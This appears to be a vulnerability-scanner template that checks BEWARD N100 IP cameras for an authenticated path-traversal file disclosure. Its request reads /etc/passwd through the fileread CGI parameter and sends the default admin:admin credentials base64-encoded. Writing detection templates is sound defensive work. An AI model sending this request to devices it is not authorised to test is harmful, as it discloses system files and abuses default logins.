id: beward-ipcamera-disclosure
name: BEWARD N100 H.264 VGA IP Camera M2.1.6 - Arbitrary File Disclosure
severity: high
confidence: tentative
description: The N100 compact color IP camera suffers from an authenticated file disclosure vulnerability. Input passed via
  the READ.filePath parameter in fileread script is not properly verified before being used to read files. This can be exploited
  to disclose the contents of arbitrary files via absolute path or via the SendCGICMD API.
reference: CWE-22
tags:
- iot
- camera
- disclosure
- edb
- vuln
requests:
- method: GET
  path: /cgi-bin/operator/fileread?READ.filePath=/etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:[x*]:0:0:'
  - type: status
    status:
    - 200
  condition: and
  headers:
    Authorization: Basic YWRtaW46YWRtaW4=
